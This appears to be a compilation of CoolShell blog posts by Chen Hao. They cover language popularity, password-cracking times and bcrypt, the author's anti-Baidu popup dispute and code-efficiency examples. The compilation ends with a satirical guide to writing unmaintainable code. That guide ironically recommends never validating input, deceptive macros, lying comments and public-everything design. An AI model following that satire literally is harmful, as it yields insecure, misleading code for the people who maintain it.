分布式系统架构，我一共出了两个系列，一个是分布式系统架构的本质，另一个是设计模式。前者偏概念，后者偏技术。这里旨在让你看到整个分布式系统设计的一个非常系统的蓝图，但是因为在手机端上，不可能写得非常细，所以，会缺失一些细节，这些细节我是故意缺失的，主要是有几方面的原因，* 一方面，这是为了阅读的效果，手机上的文章不过长，所以，不能有太多的细节。   * 另一方面，也是是想留给大家自行学习，而不是一定要我把饭喂到你的嘴里，你才能吃得着。 **学习不只是为要答案，而是学方法**   * 最后是我的私心，因为我也在创业，所以，技术细节上东西正是我在做的产品，所以，如果你想了解得更细，你需要和我有更商业合作。区块链的技术专栏本来不在我的写作计划中的，但是因为来问我这方面的技术人太多了，所以，就被问了一系列的文章，这里的文章除了一些技术上的科普，同样有有很多我的观点，你不但可以学到技术，还可以了解一些金融知识和相关的逻辑，我个人觉得这篇文章是让你有独立思考的文章。我的专栏还在继续，接下来还有一个系列的文章——《从技术到管理》，欢迎关注，也欢迎扫码订阅。**最后友情提示一下：在手机上学习并不是最好的学习方式，也不要在我的专栏上进行学习，把我的专栏当成一个你的助手，当成一个向导，当成一个跳板，真正的学习还是要在线下，专心的，系统地、有讨论地、不断实践地学习，这点希望大家切记！**
（全文完）# 编程语言流行度排名作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面的这些排名并不是非常科学的，它们只是从某种方面表现出了编程语言的流行程度。仅供参考。**Yahoo Search**   这里，我们使用了Yahoo Search API，简单地搜索了一下相关的编程语言。收搜字样是”language programming”，下面是搜索到的页面结果。也许这能够说明语言的流行程度。**工作相关**   接下来，我们来看看与工作相关的页面。也是从Yahoo Search API中从Craigslist.org网站中取得这些数据。搜索模型如下：language programmer -“job wanted” site:craigslist.org。这个结果可以看到全球的雇主在雇佣技术人员的时候所要求的编程语言的数量分布。**技术书籍**   下面是由Amason所提供的搜索API中得到的目前出版物中的编程语言相关的统计数据，一般来说，越流行的语言通常会有更多的书籍。我们来看看书籍方面的各语言的书籍数量的排行榜。**Google Code 开源项目**   下面的结果取自Googel Code (http://www.google.com/codesearch)，我们通过统计开源项目所使用的语言来查看是哪种语言在开源项目中的流行程度。
**Del.icio.us**   del.icio.us是一个网摘网站，它提供的是一种收藏、分类、排序、分享互联网信息资源的方式。使用它存储网址和相关信息列表，使用标签(Tag)对网址进行索引使网址资源有序分类和索引，使网址及相关信息的社会性分享成为可能，在分享的人为参与的过程中网址的价值被给予评估。我们来看看BLOG社区中语言流行的程度。**Ohloh 开源项目**让我们再来看一下Ohloh 上的开源项目所使用的编程语言的统计图。**programming.reddit.com**   我们再来看看聚合网站programming.reddit.com上的编程语言文章统计情况。**Slashdot**   我们来看看Slashdot.org上的编程语言的排名情况吧。还是主要根据相关的贴子的数量做统计。**IRC**   这里的数据来源于Freenode IRC网络。最后，如果你对其中的某些语言不是很熟悉的话，下面是维基百科上关于这些语言的链接。* Actionscript * Ada) * Assembly * C) * C#) * C++ * Cobol * D) * Delphi * Erlang) * Forth) * Fortran * Haskell) * Java) * JavaScript * Lisp) * Lua) * OCaml * PHP * Pascal) * Perl * Python) * Ruby) * SQL * Scheme) * Shell * Smalltalk * Tcl * Visual Basic
# 如何检查网页浏览器的兼容性作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnBrowserShots.org 是一个很不错的在线服务，它主要帮助你检查一下你所设计网站是否兼容所有的浏览器。其目前支持四个操作系统：Linux, Windows, MacOS和BSD。浏览器支持的就多了：包括MSIE，Firefox，Chrome，Safari，Opera，Dillo，SeaMonkey，Navigator等等浏览器的不同版本。使用这个在线服务其实很简单，只需要输入你的网址，并勾选一下各种浏览器。当然，你还可以指定分辨率，色彩度，Javascript，Java和Flash的版本。然后，这个网站会利用虚拟机的技术，启动操作系统然后运行相应的浏览器访问你的网站，并把图抓下来上传到你可以访问的位置以例提供你下载。需要注意的是，如果你选中了太多的浏览器，可能整个速度就有些慢了，而系统设置是30分钟过期，而可能有很多浏览器的任务却高于这个时间。所以，你需要过会就去点击一下“Extend”按钮，以告诉系统延长过期时间。下面是“酷壳”的一些抓图链接如下：# 破解你的口令
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在网上看到一张口令破解的表格，如下所示（第一列是口令长度，第二列是全小写的口令，第三列是有大写字母的口令，第四列是又加上了数字和其它字符的口令）如果你想知道自己的口令花多少时间可以被破确，你可以访问下面这个网站：（ ** _更新2011/3/2晚10点15_** ）**http://howsecureismypassword.net/**这里先说一个这里说的口令破解。一般来说用户的口令都是以MD5编码加密放在数据库里的，MD5是不可逆的，所以，当你拿到你一串被MD5后的字串，你可以使用暴力破解——穷举所有的可能口令的MD5字串，然后和数据库里的对比，比对了你就知道口令了。当然，你一定要清楚，在某些审查很严重的地方，互联网内容提供商不一定会把你的口令以MD5加密，甚至就是明文（Plain Text）保存，所以你还需要小心，关于如何设计你的口令，请参看这篇文章。从上面这表格我们可以看到，你的口令最好是在8个长度以上，而且一定要有在小写和数字，最好再加上其它字符，这样你的口令被破解的时候最需要463年，这样就比较安全了。当然，如果你的口令使用了一些常用的单词，那就另说了，现在破解口令一般都不会使用暴力破解，都是用一个尝用口令字典表来尝试——比如这篇文章所说的字典表。
但我提醒一下，这张表里中的时间忽略了一个问题，那就是并行， **可以使用多台电脑多个进程并行破解口令** ，这样一来，上表中的时间就可大打折扣了。你只需要愿意花2000美刀，你就能够找到一个地方，1秒种计算7亿个口令，因为MD5，SHA这类的算法性能太好了。所以，你可能需要使用新的算法来加密你的口令，这种算法最好加上时间，也就是在算法的计算时间加长。呵呵，慢也有慢的好处。可能你需要考虑一下bcrypt算法，你可以查看本站的这篇文章。# 又一个有趣的面试题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn大家还记得前些天的那个火柴棍式的面试题吗？很有趣吧。下面是我今天在StackExchange上看到的一个有趣的面试题。大家不妨一起来思考一下。问题如下——有两个相同功能代码如下， **请在在A，B，C是什么的情况下，请给出三个原因case 1比case 2快，还有三个原因case 2会比case 1要执行的快。** （不考虑编译器优化）我的第一个反应是——* case1 要快一些，因为只有一个i++的i<N的操作，而case 2却有三个，这在点上，case 1就比case 2要快。   * case2如果要快的话，有一个原因是，A, B, C其中一个需要去先获得一个资源（比如一个锁），在case1下，每次都要去拿这个资源，而case2下，只需要拿一次然后。但这个可能是不对的，因为我无法想出一个相同的语句块放在case 1中会和放在case 2中有差别。（不过可能比较接近了）
继续思考：这个题有点像是“ **同步和异步** ”的问题，case 1是同步，case 2是异步，所以，异步快于同步，也许可以从这个方向出发，写出A, B, C的语句块。不过，其要三个原因啊。 **各位，你们有想法吗** ？**—-更新 1—-**刚才在twitter上与人讨论，发现又有一种情况，case 2要比case 1要快。比如，A, B, C分别访问是不同的内存块（数组），那么case 1就得在不同的内存块上来回切换寻址，而case2则可以连续地访问内存块。访问连续的内存效率要高。尤其是三块大内存。**—-更新 2—**正如本贴评论中所说的，CPU的cache也是其中一个因素。大家对底层知识了解的都很不错啊。赞一个。*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# “作环保的程序员，从不用百度开始”作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn酷壳对来自百度搜索引擎的访问会弹窗，但是我的这个行为发酵出了一些事情，这里把这个事情说明如下，我会更新相关的东西。内行看门道，外行看热闹。
#### 事由**2月6日** 看到梁斌同学的微博（起因可能是因为梁斌同学在微博上对帮助百度的一些工程师们说话导致他的“微博寻人”全站被百度屏蔽）我看到后，觉得梁斌同学有点太看重被百度收录了，没有站长应该有的气质，所以，我回了一个微博——> “我的酷壳倒反而因为被百度收录而感到掉价！”**2月6日当天** ，我给coolshell做了个弹窗，并发布微博—— （该微博目前已被新浪管理员删除，后面有说明）> “搞定收工！从百度访问过来的访问弹出对话框。（CoolShell上的网页有缓存，要过些时间才有效）” > >**2月21日** ：百度的法律顾问发来邮件。> From: [[email protected]](/cdn-cgi/l/email-protection)   >  To: [[email protected]](/cdn-cgi/l/email-protection)   >  CC: [[email protected]](/cdn-cgi/l/email-protection)   >  Subject: 答复: 网站coolshell.cn弹窗事宜   >  Date: Thu, 21 Feb 2013 07:05:09 +0000 > > 陈浩，您好！ > > 我是百度法务部法律顾问，就您的网站上有贬损百度商标的弹窗，以及通过微博等途径予以传播事宜，我们希望您及时终止。 > > 如您不希望百度搜索收录您的网页，您可以通过Robots > 协议予以规定。关于如何禁止百度Robots收录您的网站，如您需要技术方面的支持，我可以协助联系百度的工程师与您沟通。 > > 如有任何问题，请随时联系。 > > 谢谢！ > > 段志勇
我当天回复邮件到——> > 『我是酷壳的法律顾问，请百度停止收录酷壳的网页，以及在所有百度产品线里删除酷壳的文章，尤其是百度文库里我所有的文章和PPT，你们已经违反了中华人民共和国版权著作法，酷壳将保留行使法律的权力』**3月2日** ：新浪微博举报大厅。（把我2月6日弹窗的微博给删除了，注意，其中没有我自辩的过程，还有其中荒唐的逻辑）我问新浪为什么没有我自辩的过程，新浪微博客服回服如下：> 尊敬的新浪微博用户： 您好！关于您反馈的被举报问题，经核实此判决符合社区公约规定判定无误，感谢您的支持，祝您生活愉快~~我没有多理会，留下一条“多谢新浪和百度的自黑”的微博我也没管这事了。**3月22日** ：收到了来自百度律师代理的邮件，如下：> From: [[email protected]](/cdn-cgi/l/email-protection)   >  To: [[email protected]](/cdn-cgi/l/email-protection)   >  Subject: 关于贵方酷壳网弹窗构成对百度公司的不正当竞争事宜   >  Date: Fri, 22 Mar 2013 10:07:10 +0800 > > 陈先生，您好！ > > 我们，北京天昊联合知识产权代理有限公司，受百度在线网络技术（北京）有限公司（以下简称“百度公司”）委托就题述事宜特致函贵方（委托书请见附件）。 > > 百度公司近日发现：用户在使用谷歌、360等浏览器通过百度搜索访问您方酷壳网（https://coolshell.cn/）时，会弹窗一个小窗，上面将百度LOGO打叉，并使用“DO > EVIL”、“做环保的程序员，从不用百度开始！”等标语，详细截图后附。我们认为：您方弹窗所含图像及语言描述缺乏事实基础，带有较强的感情色彩，足以误导互联网用户对百度公司产生不合理的怀疑乃至负面评价，从而对百度公司的商业信誉和品牌形象带来一定程度的贬损。根据《反不正当竞争法》第2、14、20条之规定，您方行为已构成对百度公司的不正当竞争。 > > 我们希望您方在收到此函后，清除所有相关侵权程序，立即停止对百度公司的所有侵权行为。我所当事人要求：贵方最迟于 **2013年3月25日** > 前向以下通信地址做出实质回应： > > 联系人：郑洪   >  地址：北京市东城区建国门内大街28号民生金融中心D座10层   >  邮编：100005   >  电话：010-8529 5526   >  传真：010-8529 5528 > > 此信函不影响我方当事人依法所享有的其他任何权利或法律救济途径。我们希望此纠纷能尽快解决，以维护互联网市场的健康有序发展。 > > 期待你方及时回复。如有任何问题，请随时与我们联系！ > > 郑洪
弹窗的抓图附件我就不列了，其中有一个委托书附件如下：#### 几个观点**1）我非常不喜欢百度公司的非常浓重的商业化**我在《 **做个环保主义的程序员** 》一文中说过一些百度的问题，如：* **搜索结果很差** 。一些非技术的东西都搜不出来。技术文章就更不要说了。再比如百度抓取酷壳的网页，一方面是不及时，另一方面是有选择地抓，很多网页并没有抓取到源文，而是抓取到那些转载过去没有注明出处的网站，像《 **做个环保主义的程序员** 》文章发布一年多了，过去的一年在百度里就查不到（这几天又能查到了）。（ **我很想了解百度的一些抓取网页的算法和搜索排名的算法，感觉相当诡异** ）* **有很多虚假广告** 。 **我觉得一家公司商业化并没有什么问题，但是这种商业化不应建立在牺牲用户利益的基础上的，这是最最基本的底线** 。我觉得百度的商业上在这方面突破了太多的底线。**2）百度应该可以做得更好**@陈晓鸣在百度在私下给我介绍了一些百度的广告方面的技术细节，说是以前的那个竞价排名不存在了。但是难免有一些垃圾和造假。就像淘宝一样也有假货和诈骗。是的， **这中国目前这个大环境下，要有一个干净的平台的确不容易。但是我希望百度能像淘宝一样，在业务上做一些打击虚假信息的活动——建立举报制，曝光所有的虚假和欺诈信息，并有一些惩罚措施。可惜百度做得还很不够主动** 。（ **与其花时间在我这里，不如花时间做好你自己的事** ）
**灰尘总是会有的，重点不在于灰尘和垃圾总是会有，重点在于想不想打扫。想不想打扫这是态度问题** 。**3）看不起百度并不是看不起百度的技术人员****我是比较敬重百度的技术人员的。我还是能够“一分为二的看问题”** 。比如：deep learning专家余凯、主导凤巢设计的戴文渊，自然语言处理顶级会议的首任华人主席王海峰，架构专家，移动云技术负责人林仕鼎等等。都是值得我学习的很不错的技术牛人。我一向是站在技术人员这边的。这点，在这个事件中也不会改变。 **我还是会推荐一些刚毕业的实在找不到更好工作的学生去百度** 。正如我在《来信，创业，移动互联网》一文中说的那样。入世和出世，取其精华去其糟粕。4） **关于弹窗这个事**关于弹窗这个事， **我非常高兴酷壳成为了百度的竞争对手** 。我会接受网友的意见， **我会将把弹窗这个事变成不弹窗，直接嵌在酷壳的每一篇文章里** 。酷壳上基本坚持不投放任何广告，这回一定要做个公益广告。关于法律上的一些事情，我无所谓， **随时欢迎百度来起诉我，不来起诉就是怂包** 。以前当过原告起诉过清华大学出版社，今天当个被告，这样我的人生经历就完整了。大家知道，人生经历对我很重要。
**5）感动和回报**我把百度委托律师给我的邮件放到了我的微博里（点击这里），很多朋友说要捐钱给我打官司。这点到是不需要了。但是我真的很感动。所以——**我觉得我应该更多的珍惜大家对我的支持。如果你们在访问一些网站有什么困难的话，可以私下联系我，我愿意为你们提供相关的技术支持。这个事只能在私下做，你们懂的** 。**当然，最好方式还是自建代理，如果你想DIY，你可以看看这篇文章。**#### 附录：弹窗代码大家问我那个弹窗是怎么做的，很简单的，可以看看coolshell.cn的源代码。就是从referrer中匹配baidu。我用了jquery的一个插件：bPopup，关于那个no baidu插图来自：豆瓣的拒绝百度的兴趣小组。源码如下： **@Ninja_Lu 做了一个github的：https://github.com/lurongkai/anti-baidu **<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>     <script src="https://coolshell.cn/wp-content/themes/inove/js/jquery.bpopup-0.8.0.min.js"></script>
})(jQuery);     </script><div id="nobaidu_dlg" style="background-color:#fff; border-radius:15px;color:#000;display:none;padding:20px;min-width:450px;min-height:180px;">     <img src="https://coolshell.cn/wp-content/themes/inove/img/nobaidu.jpg" align="left">     <p style="margin-left:200px;margin-top: 20px; line-height: 30px;">     检测到你还在使用百度这个搜索引擎，<br/>     做为一个程序员，这是一种自暴自弃！<br/>     <br/>     </p>     <p align="center" style="margin-top:20px;">     <b><a href="https://coolshell.cn/articles/7186.html">作环保的程序员，从不用百度开始！</a></b>     </p>     </div>
P.S. robots.txt我已经加上了。（全文完，谢谢大家的支持）# 代码执行的效率作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在《性能调优攻略》里，我说过，要调优性需要找到程序中的Hotspot，也就是被调用最多的地方，这种地方，只要你能优化一点点，你的性能就会有质的提高。在这里我给大家举三个关于代码执行效率的例子（它们都来自于网上）#### **第一个例子****PHP中Getter和Setter的效率** （来源reddit）这个例子比较简单，你可以跳过。考虑下面的PHP代码：我们可看到，使用Getter/Setter的方式，性能要比直接读写成员变量要差一倍以上。<?php     //dog_naive.php$rover = new dog();     //通过Getter/Setter方式     for ($x=0; $x<10; $x++) {     $t = microtime(true);     for ($i=0; $i<1000000; $i++) {     $rover->setName("rover");     $n = $rover->getName();     }     echo microtime(true) - $t;     echo "\n";     }     //直接存取变量方式     for ($x=0; $x<10; $x++) {     $t = microtime(true);     for($i=0; $i<1000000; $i++) {     $rover->name = "rover";     $n = $rover->name;     }     echo microtime(true) - $t;     echo "\n";     }     ?>
这个并没有什么稀，因为有函数调用的开销，函数调用需要压栈出栈，需要传值，有时还要需要中断，要干的事太多了。所以，代码多了，效率自然就慢了。所有的语言都这个德行，这就是为什么C++要引入inline的原因。而且Java在打开优化的时候也可以优化之。但是对于动态语言来说，这个事就变得有点困难了。你可能会以为使用下面的代码（Magic Function）会好一些，但实际其性能更差。动态语言的效率从来都是一个问题，如果你需要PHP有更好的性能，你可能需要使用FaceBook的HipHop来把PHP编译成C语言。#### **第二个例子****为什么Python程序在函数内执行得更快？** （来源StackOverflow）考虑下面的代码，一个在函数体内，一个是全局的代码。函数内的代码执行效率为 1.8sdef main():     for i in xrange(10**8):     pass     main()函数体外的代码执行效率为 4.5sfor i in xrange(10**8):     pass不用太纠结时间，只是一个示例，我们可以看到效率查得很多。为什么会这样呢？我们使用 `dis` module 反汇编函数体内的bytecode 代码，使用 `compile` builtin 反汇编全局bytecode，我们可以看到下面的反汇编（注意我高亮的地方）
13 FOR_ITER                 6 (to 22)     16 STORE_FAST               1 (i)     19 JUMP_ABSOLUTE           1313 FOR_ITER                 6 (to 22)     16 STORE_NAME               1 (i)     19 JUMP_ABSOLUTE           13我们可以看到，差别就是 `STORE_FAST` 和 `STORE_NAME，前者比后者快很多。所以，在全局代码中，变量i成了一个全局变量，而函数中的i是放在本地变量表中，所以在全局变量表中查找变量就慢很多。如果你在main函数中声明global i 那么效率也就下来了。`原因是，本地变量是存在一个数组中（直到），用一个整型常量去访问，而全局变量存在一个dictionary中，查询很慢。`（注：在`C/C++中，这个不是一个问题）#### **第三个例子****为什么排好序的数据在遍历时会更快？** （来源StackOverflow）参看如下C/C++的代码：
如果你的data数组是排好序的，那么性能是1.93s，如果没有排序，性能为11.54秒。差5倍多。无论是C/C++/Java，或是别的什么语言都基本上一样。这个问题的原因是—— **branch prediction （分支预判）**伟大的stackoverflow给了一个非常不错的解释。考虑我们一个铁路分叉，当我们的列车来的时候， 扳道员知道分个分叉通往哪，但不知道这个列车要去哪儿，司机知道要去哪，但是不知道走哪条分叉。所以，我们需要让列车停下来，然后司机和扳道员沟通一下。这样的性能太差了。所以，我们可以优化一下，那就是猜，我们至少有50%的概率猜对，如果猜对了，火车行驶性能巨高，猜错了，就得让火车退回来。如果我猜对的概率高，那么，我们的性能就会高，否则老是猜错了，性能就很差。Image by Mecanismo, from Wikimedia Commons:http://commons.wikimedia.org/wiki/File:Entroncamento_do_Transpraia.JPG我们的if-else 就像这个铁路分叉一样，下面红箭头所指的就是搬道器。那么，我们的搬道器是怎么预判的呢？就是使用过去的历史数据，如果历史数据有90%以上的走左边，那么就走左边。所以，我们排好序的数据就更容易猜得对。
T = 走分支（条件表达式为true）     N = 不走分支(条件表达式为false)data[] = 0, 1, 2, 3, 4, ... 126, 127, 128, 129, 130, ... 250, 251, 252, ...     branch = N  N  N  N  N  ...   N    N    T    T    T  ...   T    T    T  ...= NNNNNNNNNNNN ... NNNNNNNTTTTTTTTT ... TTTTTTTTTT  (easy to predict)data[] = 226, 185, 125, 158, 198, 144, 217, 79, 202, 118,  14, 150, 177, 182, 133, ...     branch =   T,   T,   N,   T,   T,   T,   T,  N,   T,   N,   N,   T,   T,   T,   N  ...= TTNTTTTNTNNTTTN ...   (completely random - hard to predict)
从上面我们可以看到，排好序的数据更容易预测分支。对此，那我们怎么办？我们需要在这种循环中除去if-else语句。比如：我们把条件语句：if (data[j] >= 128)     sum += data[j];变成：int t = (data[j] - 128) >> 31;     sum += ~t & data[j];“没有分叉”的性能基本上和“排好序有分支”一个样，无论是C/C++，还是Java。> **注：** 在GCC下，如果你使用 `-O3` or `-ftree-vectorize` > 编译参数，GCC会帮你优化分叉语句为无分叉语句。VC++2010没有这个功能。**最后，推荐大家一个网站——Google Speed，网站上的有一些教程告诉你如何写出更快的Web程序。******（全文完）# 如何写出无法维护的代码作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn酷壳里有很多我觉得很不错的文章，但是访问量最大的却是那篇《6个变态的Hello World》，和它能在本站右边栏“ **全站热门** ”中出现的还有“如何加密源代码”，以及编程真难啊等这样的文章。可见本站的读者们的偏好，我也相信你们都是“身怀绝技”的程序员。所以，今天给大家推荐这篇文章，相信一定能触动大家的兴奋点。
这篇文章的原文在这里（），我看完后我想说——1. **什么叫“创造力”，创造力就是——就算是要干一件烂事都能干得那么漂亮那么有创意的能力。**   2. **什么叫“抓狂”，抓狂就是——以一种沉着老练的不屈不挠的一本正经的精神一点一点把你推向崩溃的边缘** 。我把文章节选了一些，也并没有完全翻译，简译一下，也加入了一些自己的调侃。对于有下面这些编程习惯的朋友，请大家对号入座。另外，维护程序的朋友们，你们死定了！！> !woodpeckerIf builders > built buildings the way programmers write programs, then the first > woodpecker that came along would destroy civilization. > （如果建筑师盖房子就像程序员写程序一样，那么，第一只到来的啄木鸟就能毁掉我们的文明） > > ~ Gerald Weinberg (born: 1933-10-27 age: 77) Weinberg’s Second > Law目录* 程序命名   * 伪装欺诈   * 文档和注释   * 程序设计   * 混乱你的代码   * 测试   * 其它   * Write Everywhere, Read Nowhere
#### 程序命名* **容易输入的名字** 。比如：Fred，asdf   * **单字母的变量名** 。比如：a,b,c, x,y,z（陈皓注：如果不够用，可以考虑a1,a2,a3,a4,….）   * **有创意地拼写错误** 。比如：SetPintleOpening， SetPintalClosing。这样可以让人很难搜索代码。   * **抽象** 。比如：ProcessData, DoIt, GetData… 抽象到就跟什么都没说一样。   * **缩写** 。比如：WTF，RTFSC …… （陈皓注：使用拼音缩写也同样给力，比如： BT，TMD，TJJTDS）   * **随机大写字母** 。比如：gEtnuMbER..   * **重用命名** 。在内嵌的语句块中使用相同的变量名有奇效。   * **使用重音字母** 。比如：int ínt（注：第二个 ínt不是int）   * **使用下划线** 。比如：_, __, ___。   * **使用不同的语言** 。比如混用英语，德语，或是中文拼音。   * **使用字符命名** 。比如：slash, asterix, comma…   * **使用无关的单词** 。比如：god, superman, iloveu….   * **混淆l和1** 。字母l和数字1有时候是看不出来的。
#### 伪装欺诈* **把注释和代码交织在一起** 。* **隐藏宏定义** 。如：#define a=b a=0-b，当人们看到a=b时，谁也想不到那是一个宏。* **换行** 。如下所示，下面的示例使用搜索xy_z变得困难。#define local_var xy\     _z // local_var OK* **代码和显示不一致** 。比如，你的界面显示叫postal code，但是代码里确叫 zipcode.* **隐藏全局变量** 。把使用全局变量以函数参数的方式传递给函数，这样可以让人觉得那个变量不是全局变量。* **使用同意词** 。如：#define xxx global_var // in file std.h&nbsp;     #define xy_z xxx // in file ..\other\substd.h&nbsp;     #define local_var xy_z // in file ..\codestd\inst.h* **使用相似的变量名** 。如：单词相似，swimmer 和 swimner，字母相似：ilI1| 或 oO08。parselnt 和 parseInt， D0Calc 和 DOCalc。还有这一组：xy_Z, xy__z, _xy_z, _xyz, XY_Z, xY_z, Xy_z。
* **重载函数** 。使用相同的函数名，但是其功能和具体实现完全没有关系。* **操作符重载** 。重载操作符可以让你的代码变得诡异，感谢CCTV，感谢C++。这个东西是可以把混乱代码提高到一种艺术的形式。比如：重载一个类的 ! 操作符，但实际功能并不是取反，让其返回一个整数。于是，如果你使用 ! ! 操作符，那么，有意思的事就发生了—— 先是调用类的重载 ! 操作符，然后把其返回的整数给 ! 成了 布尔变量，如果是 !!! 呢？呵呵。* **#define** 。看过本站那些混乱代码的文章，你都会知道宏定义和预编译对于写出不可读的代码的重大意义。不过，一个具有想像力的东西是——在头文件中使用预编译来查看这个头文件被include了几次，而被include不同的次数时，其中的函数定义完全不一样。#ifndef DONE     #ifdef TWICE     // put stuff here to declare 3rd time around     void g(char* str);     #define DONE     #else // TWICE     #ifdef ONCE     // put stuff here to declare 2nd time around<     void g(void* str);     #define TWICE     #else // ONCE     // put stuff here to declare 1st time around     void g(std::string str);     #define ONCE     #endif // ONCE     #endif // TWICE     #endif // DONE
#### 文档和注释* **在注释中撒谎** 。你不用真的去撒谎，只需在改代码的时候不要更新注释就可以了。   * **注释明显的东西** 。比如：/* add 1 to i */。（参看本站的“五种应该避免的注释”）   * **只注释是什么，而不是为什么** 。   * **不要注释秘密** 。如果你开发一个航班系统，请你一定要保证每有一个新的航班被加入，就得要修改25个以上的位置的程序。千万别把这个事写在文档中。   * **注重细节** 。当你设计一个很复杂的算法的时候，你一定要把所有的详细细设计都写下来，没有100页不能罢休，段落要有5级以上，段落编号要有500个以上，例如：1.2.4.6.3.13 – Display all impacts for activity where selected mitigations can apply (short pseudocode omitted). 这样，当你写代码的时候，你就可以让你的代码和文档一致，如：Act1_2_4_6_3_13()   * **千万不要注释度衡单位** 。比如时间用的是秒还是毫秒，尺寸用的是像素还是英寸，大小是MB还是KB。等等。另外，在你的代码里，你可以混用不同的度衡单位，但也不要注释。   * **Gotchas** 。陷阱，千万不要注释代码中的陷阱。   * **在注释和文档中发泄不满** 。（参看本站的“五种应该避免的注释”）
#### 程序设计* **Java Casts** 。Java的类型转型是天赐之物。每一次当你从Collection里取到一个object的时候，你都需要把其转回原来的类型。因些，这些转型操作会出现在N多的地方。如果你改变了类型，那么你不一定能改变所有的地方。而编译器可能能检查到，也可能检查不到。   * **利用Java的冗余** 。比如：Bubblegum b = new Bubblegom(); 和 swimmer = swimner + 1; 注意变量间的细微差别。   * **从不验证** 。从不验证输入的数据，从不验证函数的返回值。这样做可以向大家展示你是多么的信任公司的设备和其它程序员。   * **不要封装** 。调用者需要知道被调用的所有的细节。   * **克隆和拷贝** 。为了效率，你要学会使用copy + paste。你几乎都不用理解别人的代码，你就可以高效地编程了。（陈皓注：Copy + Paste出来的代码bug多得不能再多）   * **巨大的listener** 。写一个listener，然后让你的所有的button类都使用这个listener，这样你可以在这个listener中整出一大堆if…else…语句，相当的刺激。   * **使用三维数组** 。如果你觉得三维还不足够，你可以试试四维。   * **混用** 。同时使用类的get/set方法和直接访问那个public变量。这样做的好处是可以极大的挫败维护人员。   * **包装，包装，包装** 。把你所有的API都包装上6到8遍，包装深度多达4层以上。然后包装出相似的功能。   * **没有秘密** 。把所有的成员都声明成public的。这样，你以后就很难限制其被人使用，而且这样可以和别的代码造成更多的耦合度，可以让你的代码存活得更久。   * **排列和阻碍** 。把drawRectangle(height, width) 改成 drawRectangle(width, height)，等release了几个版本后，再把其改回去。这样维护程序的程序员们将不能很快地明白哪一个是对的。   * **把变量改在名字上** 。例如，把setAlignment(int alignment)改成，setLeftAlignment, setRightAlignment, setCenterAlignment。   * **Packratting** 。保留你所有的没有使用的和陈旧的变量，方法和代码。   * **That’s Fina** l。Final你所有的子结点的类，这样，当你做完这个项目后，没有人可以通过继承来扩展你的类。java.lang.String不也是这样吗？   * **避免使用接口** 。在java中，BS接口，在C++中BS使用虚函数。   * **避免使用layout** 。这样就使得我们只能使用绝对坐标。如果你的老大强制你使用layout，你可以考虑使用GridBagLayout，然后把grid坐标hard code.   * **环境变量** 。如果你的代码需要使用环境变量。(getenv() – C++ / System.getProperty() – Java )，那么，你应该把你的类的成员的初始化使用环境变量，而不是构造函数。   * **使用Magic numbe** r。参看《Linux一个插曲》。   * **使用全局变量** 。1）把全局变量的初始化放在不同的函数中，就算这个函数和这个变量没有任何关系，这样能够让我们的维护人员就像做侦探工作一样。2）使用全局变量可以让你的函数的参数变得少一些。   * **配置文件** 。配置文件主要用于一些参数的初始化。在编程中，我们可以让配置文件中的参数名和实际程序中的名字不一样。   * **膨胀你的类** 。让你的类尽可能地拥有各种臃肿和晦涩的方法。比如，你的类只实现一种可能性，但是你要提供所有可能性的方法。不要定义其它的类，把所有的功能都放在一个类中。   * **使用子类** 。面向对象是写出无法维护代码的天赐之物。如果你有一个类有十个成为（变量和方法）你可以考虑写10个层次的继承，然后把这十个属性分别放在这十个层次中。如果可能的话，把这十个类分别放在十个不同的文件中。
#### 混乱你的代码* **使用XML** 。XML的强大是无人能及的。使用XML你可以把本来只要10行的代码变成100行。而且，还要逼着别人也有XML。（参看，信XML得永生，信XML得自信）   * **混乱C代码** 。在《如何加密源代码》中已经说过一些方法了，这里再补充一些。   * **使用不同的进制** 。比如：10 和010不是一样的。再比如：array = new int[]{ 111, 120, 013, 121,};   * **尽量使用void*** 。然后把其转成各种类型   * **使用隐式的转型** 。C++的构造函数可以让你神不知鬼不觉得完成转型。   * **分解条件表达式** 。如：把 a==100分解成，a>99 && a<101   * **学会利用分号** 。如：if ( a );else;{ int d; d = c;}   * **间接转型** 。如：把double转string，写成new Double(d).toString() 而不是 Double.toString(d)   * **大量使用嵌套** 。一个NB的程序员可以在一行代码上使用超过10层的小括号（），或是在一个函数里使用超过20层的语句嵌套{}，把嵌套的if else 转成 [? :] 也是一件很NB的事。   * **使用C的变种数组** 。myArray[i] 可以变成*(myArray + i) 也可以变成 *(i + myArray) 其等价于 i[myArray]。再看一个函数调用的示例，函数声明：int myfunc(int q, int p) { return p%q; } 函数调用myfunc(6291, 8)[Array];   * **长代码行** 。一行的代码越长越好。这样别人阅读时就需要来来回回的   * **不要较早的return** 。不要使用goto，不要使用break，这样，你就需要至少5层以上的if-else来处理错误。   * **不要使用{}** 。不要在if else使用{}，尤其是在你重量地使用if-else嵌套时，你甚至可以在其中乱缩进代码，这样一来，就算是最有经验的程序员也会踩上陷阱。   * **使用宏定义** 。宏定义绝对是混乱C/C++代码的最佳利器。参看 老手是这样教新手编程的。   * **琐碎的封装** 。比较封装一个bool类，类里面什么都做，就是一个bool.   * **循环** 。千万不可用for(int i=0; i<n; i++)使用while代替for，交换n和i，把<改成<=，使用 i–调整步伐 。
